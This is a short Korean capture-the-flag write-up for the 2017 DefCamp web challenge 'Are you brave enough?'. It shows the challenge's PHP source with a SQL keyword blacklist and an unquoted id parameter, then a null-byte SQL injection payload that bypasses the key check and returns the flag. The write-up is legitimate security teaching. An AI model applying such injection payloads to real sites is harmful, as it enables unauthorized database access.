# [2017_DefCamp] \[Web] Are you brave enough? 

### Solution

`https://brave.dctf-quals-17.def.camp/index.php~`에서 소스코드를 확인할 수 있습니다.

```php
<?php

$db  = mysqli_connect('localhost','web_brave','','web_brave');

$id  = @$_GET['id'];
$key = $db->real_escape_string(@$_GET['key']);

if(preg_match('/\s|[\(\)\'"\/\\=&\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i', $id))
    die('Attack Detected. Try harder: '. $_SERVER['REMOTE_ADDR']); // attack detected

$query = "SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '".$key."'";
$q = $db->query($query);

if($q->num_rows) {
    echo '<h3>Users:</h3><ul>';
    while($row = $q->fetch_array()) {
        echo '<li>'.$row['name'].'</li>';
    }

    echo '</ul>';
} else {    
    die('<h3>Nop.</h3>');
}
?>
```

SQL injection 문제입니다. $id 주변에 인용 부호가 안붙어 있는 것을 확인할 수 있습니다.

`https://brave.dctf-quals-17.def.camp/index.php?id=users.id;%00`

```
Users:

Try Harder
DCTF{602dcfeedd3aae23f05cf93d121907ec925bd70c50d78ac839ad48c0a93cfc54}
```

